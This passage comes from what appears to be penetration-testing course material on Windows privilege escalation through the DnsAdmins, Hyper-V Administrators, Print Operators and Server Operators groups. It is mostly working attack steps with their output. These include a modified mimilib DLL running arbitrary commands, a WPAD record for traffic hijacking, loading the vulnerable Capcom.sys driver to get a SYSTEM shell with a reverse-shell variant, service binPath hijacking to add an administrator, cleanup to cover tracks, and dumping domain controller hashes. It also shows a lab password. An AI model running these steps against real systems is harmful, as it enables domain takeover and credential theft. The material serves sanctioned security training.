Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
</code></pre>
<p><strong>Starting the DNS Service Again</strong></p>
<p>Once this is done, we can start up the DNS service again.</p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; sc.exe start dns

<span class="hljs-attribute">SERVICE_NAME</span>: dns
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">2</span>  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x7d0
        <span class="hljs-attribute">PID                </span>: <span class="hljs-number">4984</span>
        <span class="hljs-attribute">FLAGS              </span>:
</code></pre>
<p><strong>Checking DNS Service Status</strong></p>
<p>If everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an <code>nslookup</code> against the localhost or another host in the domain.</p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; sc query dns

<span class="hljs-attribute">SERVICE_NAME</span>: dns
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">4</span>  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0
</code></pre>
<p>Once again, this is a potentially destructive attack that we should only carry out with explicit permission from and in coordination with our client. If they understand the risks and want to see a full proof of concept, then the steps outlined in this section will help demonstrate the attack and clean up afterward.</p>
<hr>
<h3 id="using-mimilib-dll">Using Mimilib.dll</h3>
<p>As detailed in this <a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">post</a>, we could also utilize <a href="https://github.com/gentilkiwi/mimikatz/tree/master/mimilib">mimilib.dll</a> from the creator of the <code>Mimikatz</code> tool to gain command execution by modifying the <a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c">kdns.c</a> file to execute a reverse shell one-liner or another command of our choosing.</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-comment">/*    Benjamin DELPY `gentilkiwi`
    https://blog.gentilkiwi.com
    benjamin@gentilkiwi.com
    Licence : https://creativecommons.org/licenses/by/4.0/
*/</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"kdns.h"</span></span>

<span class="hljs-function">DWORD WINAPI <span class="hljs-title">kdns_DnsPluginInitialize</span><span class="hljs-params">(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)</span>
</span>{
    <span class="hljs-keyword">return</span> ERROR_SUCCESS;
}

<span class="hljs-function">DWORD WINAPI <span class="hljs-title">kdns_DnsPluginCleanup</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">return</span> ERROR_SUCCESS;
}

<span class="hljs-function">DWORD WINAPI <span class="hljs-title">kdns_DnsPluginQuery</span><span class="hljs-params">(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)</span>
</span>{
    FILE * kdns_logfile;
<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(push)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(disable:4996)</span>
    <span class="hljs-keyword">if</span>(kdns_logfile = _wfopen(<span class="hljs-string">L"kiwidns.log"</span>, <span class="hljs-string">L"a"</span>))
<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(pop)</span>
    {
        klog(kdns_logfile, <span class="hljs-string">L"%S (%hu)\n"</span>, pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system(<span class="hljs-string">"ENTER COMMAND HERE"</span>);
    }
    <span class="hljs-keyword">return</span> ERROR_SUCCESS;
}
</code></pre>
<hr>
<h3 id="creating-a-wpad-record">Creating a WPAD Record</h3>
<p>Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to <a href="https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps">disable global query block security</a>, which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.</p>
<p>After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as <a href="https://github.com/lgandx/Responder">Responder</a> or <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a> to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.</p>
<p><strong>Disabling the Global Query Block List</strong></p>
<p>To set up this attack, we first disabled the global query block list:</p>
<p>DnsAdmins</p>
<pre><code class="lang-powershell-session">C:\htb&gt; Set-DnsServerGlobalQueryBlockList -Enable <span class="hljs-variable">$false</span> -ComputerName dc01<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
</code></pre>
<p><strong>Adding a WPAD Record</strong></p>
<p>Next, we add a WPAD record pointing to our attack machine.</p>
<p>DnsAdmins</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">Add-DnsServerResourceRecordA</span> <span class="hljs-selector-tag">-Name</span> <span class="hljs-selector-tag">wpad</span> <span class="hljs-selector-tag">-ZoneName</span> <span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.local</span> <span class="hljs-selector-tag">-ComputerName</span> <span class="hljs-selector-tag">dc01</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span> <span class="hljs-selector-tag">-IPv4Address</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.3</span>
</code></pre>
<h2 id="hyper-v-administrators">Hyper-V Administrators</h2>
<hr>
<p>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators">Hyper-V Administrators</a> group has full access to all <a href="https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines">Hyper-V features</a>. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.</p>
<p>It is also well documented on this <a href="https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/">blog</a>, that upon deleting a virtual machine, <code>vmms.exe</code> attempts to restore the original file permissions on the corresponding <code>.vhdx</code> file and does so as <code>NT AUTHORITY\SYSTEM</code>, without impersonating the user. We can delete the <code>.vhdx</code> file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.</p>
<p>If the operating system is vulnerable to <a href="https://www.tenable.com/cve/CVE-2018-0952">CVE-2018-0952</a> or <a href="https://www.tenable.com/cve/CVE-2019-0841">CVE-2019-0841</a>, we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.</p>
<p><strong>Target File</strong></p>
<p>An example of this is Firefox, which installs the <code>Mozilla Maintenance Service</code>. We can update <a href="https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1">this exploit</a> (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:</p>
<p>Hyper-V Administrators</p>
<pre><code class="lang-shell-session">C:<span class="hljs-string">\Program</span> Files (x86)<span class="hljs-string">\Mozilla</span> Maintenance Service<span class="hljs-string">\maintenanceservice.exe</span>
</code></pre>
<p><strong>Taking Ownership of the File</strong></p>
<p>After running the PowerShell script, we should have full control of this file and can take ownership of it.</p>
<p>Hyper-V Administrators</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-string">\htb&gt;</span> takeown /F C:<span class="hljs-string">\Program</span> Files (x86)<span class="hljs-string">\Mozilla</span> Maintenance Service<span class="hljs-string">\maintenanceservice.exe</span>
</code></pre>
<p><strong>Starting the Mozilla Maintenance Service</strong></p>
<p>Next, we can replace this file with a malicious <code>maintenanceservice.exe</code>, start the maintenance service, and get command execution as SYSTEM.</p>
<pre><code class="lang-cmd-session">C:\htb&gt; sc<span class="hljs-selector-class">.exe</span> start MozillaMaintenance
</code></pre>
<p><strong>Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.</strong></p>
<h2 id="print-operators">Print Operators</h2>
<hr>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators">Print Operators</a> is another highly privileged group, which grants its members the <code>SeLoadDriverPrivilege</code>, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command <code>whoami /priv</code>, and don&#39;t see the <code>SeLoadDriverPrivilege</code> from an unelevated context, we will need to bypass UAC.</p>
<p><strong>Confirming Privileges</strong></p>
<p>Print Operators</p>
<pre><code class="lang-cmd-session">C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
</code></pre>
<p><strong>Checking Privileges Again</strong></p>
<p>The <a href="https://github.com/hfiref0x/UACME">UACMe</a> repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, <code>SeLoadDriverPrivilege</code> is visible but disabled.</p>
<p>Print Operators</p>
<pre><code class="lang-cmd-session">C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system                   Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
</code></pre>
<p>It&#39;s well known that the driver <code>Capcom.sys</code> contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use <a href="https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp">this</a> tool to load the driver. The PoC enables the privilege as well as loads the driver for us.</p>
<p>Download it locally and edit it, pasting over the includes below.</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sddl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-string">"tchar.h"</span></span>
</code></pre>
<p>Next, from a Visual Studio 2019 Developer Command Prompt, compile it using <strong>cl.exe</strong>.</p>
<p><strong>Compile with cl.exe</strong></p>
<p>Print Operators</p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\Users\mrb3n\Desktop\<span class="hljs-keyword">Print</span> Operators&gt;cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) <span class="hljs-keyword">C</span>/<span class="hljs-keyword">C</span>++ Optimizing Compiler <span class="hljs-keyword">Version</span> <span class="hljs-number">19.28</span><span class="hljs-number">.29913</span> for x86
Copyright (<span class="hljs-keyword">C</span>) Microsoft Corporation.  <span class="hljs-keyword">All</span> rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker <span class="hljs-keyword">Version</span> <span class="hljs-number">14.28</span><span class="hljs-number">.29913</span><span class="hljs-number">.0</span>
Copyright (<span class="hljs-keyword">C</span>) Microsoft Corporation.  <span class="hljs-keyword">All</span> rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
</code></pre>
<p><strong>Add Reference to Driver</strong></p>
<p>Next, download the <code>Capcom.sys</code> driver from <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">here</a>, and save it to <code>C:\temp</code>. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.</p>
<p>Print Operators</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; reg add HKCU<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>APCOM /v ImagePath /t REG_SZ /d "<span class="hljs-symbol">\?</span>?<span class="hljs-symbol">\C</span>:<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\C</span>apcom.sys"

The operation completed successfully.


C:<span class="hljs-symbol">\h</span>tb&gt; reg add HKCU<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>APCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
</code></pre>
<p>The odd syntax <code>\??\</code> used to reference our malicious driver&#39;s ImagePath is an <a href="https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c">NT Object Path</a>. The Win32 API will parse and resolve this path to properly locate and load our malicious driver.</p>
<p><strong>Verify Driver is not Loaded</strong></p>
<p>Using Nirsoft&#39;s <a href="http://www.nirsoft.net/utils/driverview.html">DriverView.exe</a>, we can verify that the Capcom.sys driver is not loaded.</p>
<p>Print Operators</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; .\DriverView.exe /stext drivers.txt
PS <span class="hljs-keyword">C</span>:\htb&gt; cat drivers.txt | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">String</span> -pattern Capcom
</code></pre>
<p><strong>Verify Privilege is Enabled</strong></p>
<p>Run the <code>EnableSeLoadDriverPrivilege.exe</code> binary.</p>
<p>Print Operators</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; EnableSeLoadDriverPrivilege.exe
<span class="hljs-symbol">
whoami:</span>
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by <span class="hljs-keyword">default</span>
SeIncreaseWorkingSetPrivilege    Disabled
<span class="hljs-string">NTSTATUS:</span> <span class="hljs-number">00000000</span>, <span class="hljs-string">WinError:</span> <span class="hljs-number">0</span>
</code></pre>
<p><strong>Verify Capcom Driver is Listed</strong></p>
<p>Next, verify that the Capcom driver is now listed.</p>
<p>Print Operators</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; .\DriverView.exe /stext drivers.txt
PS <span class="hljs-string">C:</span>\htb&gt; cat drivers.txt | Select-String -pattern Capcom

Driver <span class="hljs-string">Name           :</span> Capcom.sys
<span class="hljs-string">Filename              :</span> <span class="hljs-string">C:</span>\Tools\Capcom.sys
</code></pre>
<p><strong>Use ExploitCapcom Tool to Escalate Privileges</strong></p>
<p>To exploit the Capcom.sys, we can use the <a href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a> tool after compiling with it Visual Studio.</p>
<p>Print Operators</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; .\<span class="hljs-selector-tag">ExploitCapcom</span><span class="hljs-selector-class">.exe</span>

<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Capcom</span><span class="hljs-selector-class">.sys</span> <span class="hljs-selector-tag">exploit</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Capcom</span><span class="hljs-selector-class">.sys</span> <span class="hljs-selector-tag">handle</span> <span class="hljs-selector-tag">was</span> <span class="hljs-selector-tag">obained</span> <span class="hljs-selector-tag">as</span> 0000000000000070
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Shellcode</span> <span class="hljs-selector-tag">was</span> <span class="hljs-selector-tag">placed</span> <span class="hljs-selector-tag">at</span> 0000024822<span class="hljs-selector-tag">A50008</span>
<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">Shellcode</span> <span class="hljs-selector-tag">was</span> <span class="hljs-selector-tag">executed</span>
<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">Token</span> <span class="hljs-selector-tag">stealing</span> <span class="hljs-selector-tag">was</span> <span class="hljs-selector-tag">successful</span>
<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">The</span> <span class="hljs-selector-tag">SYSTEM</span> <span class="hljs-selector-tag">shell</span> <span class="hljs-selector-tag">was</span> <span class="hljs-selector-tag">launched</span>
</code></pre>
<p>This launches a shell with SYSTEM privileges.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/capcomexploit.png" alt="printopsexploit"></p>
<hr>
<h3 id="alternate-exploitation-no-gui">Alternate Exploitation - No GUI</h3>
<p>If we do not have GUI access to the target, we will have to modify the <code>ExploitCapcom.cpp</code> code before compiling. Here we can edit line 292 and replace <code>&quot;C:\\Windows\\system32\\cmd.exe&quot;</code> with, say, a reverse shell binary created with <code>msfvenom</code>, for example: <code>c:\ProgramData\revshell.exe</code>.</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-comment">// Launches a command shell process</span>
<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">LaunchShell</span><span class="hljs-params">()</span>
</span>{
    TCHAR CommandLine[] = TEXT(<span class="hljs-string">"C:\\Windows\\system32\\cmd.exe"</span>);
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { <span class="hljs-keyword">sizeof</span>(StartupInfo) };
    <span class="hljs-keyword">if</span> (!CreateProcess(CommandLine, CommandLine, <span class="hljs-literal">nullptr</span>, <span class="hljs-literal">nullptr</span>, FALSE,
        CREATE_NEW_CONSOLE, <span class="hljs-literal">nullptr</span>, <span class="hljs-literal">nullptr</span>, &amp;StartupInfo,
        &amp;ProcessInfo))
    {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<p>The <code>CommandLine</code> string in this example would be changed to:</p>
<p>Code: c</p>
<pre><code class="lang-c"> TCHAR CommandLine[] = TEXT(<span class="hljs-string">"C:<span class="hljs-subst">\\</span>ProgramData<span class="hljs-subst">\\</span>revshell.exe"</span>);
</code></pre>
<p>We would set up a listener based on the <code>msfvenom</code> payload we generated and hopefully receive a reverse shell connection back when executing <code>ExploitCapcom.exe</code>. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.</p>
<hr>
<h3 id="automating-the-steps">Automating the Steps</h3>
<p><strong>Automating with EopLoadDriver</strong></p>
<p>We can use a tool such as <a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">EoPLoadDriver</a> to automate the process of enabling the privilege, creating the registry key, and executing <code>NTLoadDriver</code> to load the driver. To do this, we would run the following:</p>
<p>Print Operators</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; EoPLoadDriver.exe System<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>apcom c:<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\C</span>apcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: <span class="hljs-symbol">\R</span>egistry<span class="hljs-symbol">\U</span>ser<span class="hljs-symbol">\S</span>-1-5-21-454284637-3659702366-2958135535-1103<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>apcom
NTSTATUS: c000010e, WinError: 0
</code></pre>
<p>We would then run <code>ExploitCapcom.exe</code> to pop a SYSTEM shell or run our custom binary.</p>
<hr>
<h3 id="clean-up">Clean-up</h3>
<p><strong>Removing Registry Key</strong></p>
<p>We can cover our tracks a bit by deleting the registry key added earlier.</p>
<p>Print Operators</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; reg delete HKCU<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>apcom

Permanently delete the registry key HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>apcom (Yes/No)? Yes

The operation completed successfully.
</code></pre>
<p><strong>Note: Since Windows 10 Version 1803, the &quot;SeLoadDriverPrivilege&quot; is not exploitable, as it is no longer possible to include references to registry keys under &quot;HKEY_CURRENT_USER&quot;.</strong></p>
<h2 id="server-operators">Server Operators</h2>
<hr>
<p>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators">Server Operators</a> group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.</p>
<p>Membership of this group confers the powerful <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> privileges and the ability to control local services.</p>
<p><strong>Querying the AppReadiness Service</strong></p>
<p>Let&#39;s examine the <code>AppReadiness</code> service. We can confirm that this service starts as SYSTEM using the <code>sc.exe</code> utility.</p>
<p>Server Operators</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

<span class="hljs-attribute">SERVICE_NAME</span>: AppReadiness
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">20</span>  WIN32_SHARE_PROCESS
        <span class="hljs-attribute">START_TYPE         </span>: <span class="hljs-number">3</span>   DEMAND_START
        <span class="hljs-attribute">ERROR_CONTROL      </span>: <span class="hljs-number">1</span>   NORMAL
        <span class="hljs-attribute">BINARY_PATH_NAME   </span>: <span class="hljs-attribute">C</span>:\Windows\System32\svchost.exe -k AppReadiness -p
        <span class="hljs-attribute">LOAD_ORDER_GROUP   </span>:
        <span class="hljs-attribute">TAG                </span>: <span class="hljs-number">0</span>
        <span class="hljs-attribute">DISPLAY_NAME       </span>: App Readiness
        <span class="hljs-attribute">DEPENDENCIES       </span>:
        <span class="hljs-attribute">SERVICE_START_NAME </span>: LocalSystem
</code></pre>
<p><strong>Checking Service Permissions with PsService</strong></p>
<p>We can use the service viewer/controller <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice">PsService</a>, which is part of the Sysinternals suite, to check permissions on the service. <code>PsService</code> works much like the <code>sc</code> utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.</p>
<p>Server Operators</p>
<pre><code class="lang-cmd-session">C:\htb&gt; c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
<span class="hljs-keyword">Copyright</span> (C) 2001-2010 <span class="hljs-keyword">Mark</span> Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: <span class="hljs-keyword">App</span> Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                <span class="hljs-keyword">Query</span> status
                <span class="hljs-keyword">Query</span> Config
                Interrogate
                Enumerate Dependents
                <span class="hljs-keyword">Pause</span>/Resume
                Start
                Stop
                User-Defined Control
                <span class="hljs-keyword">Read</span> Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                <span class="hljs-keyword">Query</span> status
                <span class="hljs-keyword">Query</span> Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                <span class="hljs-keyword">Read</span> Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                <span class="hljs-keyword">Query</span> status
                <span class="hljs-keyword">Query</span> Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                <span class="hljs-keyword">Read</span> Permissions
        [ALLOW] BUILTIN\Server Operators
                All
</code></pre>
<p>This confirms that the Server Operators group has <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">SERVICE_ALL_ACCESS</a> access right, which gives us full control over this service.</p>
<p><strong>Checking Local Admin Group Membership</strong></p>
<p>Let&#39;s take a look at the current members of the local administrators group and confirm that our target account is not present.</p>
<p>Server Operators</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete <span class="hljs-keyword">and</span> unrestricted access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> computer/domain

Members

<span class="hljs-comment">-------------------------------------------------------------------------------</span>
Administrator
Domain Admins
Enterprise Admins
The <span class="hljs-keyword">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.
</code></pre>
<p><strong>Modifying the Service Binary Path</strong></p>
<p>Let&#39;s change the binary path to execute a command which adds our current user to the default local administrators group.</p>
<p>Server Operators</p>
<pre><code class="lang-cmd-session">C:\htb&gt; <span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> AppReadiness <span class="hljs-keyword">binPath= </span><span class="hljs-string">"cmd /c net localgroup Administrators server_adm /add"</span>

[<span class="hljs-keyword">SC] </span>ChangeServiceConfig SUCCESS
</code></pre>
<p><strong>Starting the Service</strong></p>
<p>Starting the service fails, which is expected.</p>
<p>Server Operators</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-string">\htb&gt;</span> sc start AppReadiness

[SC] StartService FAILED <span class="hljs-number">1053</span>:

The service did <span class="hljs-keyword">not</span> respond <span class="hljs-keyword">to</span> the start <span class="hljs-keyword">or</span> control request <span class="hljs-keyword">in</span> a timely fashion.
</code></pre>
<p><strong>Confirming Local Admin Group Membership</strong></p>
<p>If we check the membership of the administrators group, we see that the command was executed successfully.</p>
<p>Server Operators</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete <span class="hljs-keyword">and</span> unrestricted access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> computer/domain

Members

<span class="hljs-comment">-------------------------------------------------------------------------------</span>
Administrator
Domain Admins
Enterprise Admins
server_adm
The <span class="hljs-keyword">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.
</code></pre>
<p><strong>Confirming Local Admin Access on Domain Controller</strong></p>
<p>From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.</p>
<p>Server Operators</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ crackmapexec smb <span class="hljs-number">10.129</span><span class="hljs-number">.43</span><span class="hljs-number">.9</span> -u server_adm -p <span class="hljs-string">'HTB_@cademy_stdnt!'</span>

SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.43</span><span class="hljs-number">.9</span>     <span class="hljs-number">445</span>    WINLPE-DC01      [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> (<span class="hljs-string">name:</span>WINLPE-DC01) (<span class="hljs-string">domain:</span>INLANEFREIGHT.LOCAL) (<span class="hljs-string">signing:</span>True) (<span class="hljs-string">SMBv1:</span>False)
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.43</span><span class="hljs-number">.9</span>     <span class="hljs-number">445</span>    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\<span class="hljs-string">server_adm:</span>HTB_<span class="hljs-meta">@cademy</span>_stdnt! (Pwn3d!)
</code></pre>
<p><strong>Retrieving NTLM Password Hashes from the Domain Controller</strong></p>
<p>Server Operators</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ secretsdump.py server_adm@<span class="hljs-number">10.129</span>.<span class="hljs-number">43.9</span> -just-dc-user administrator

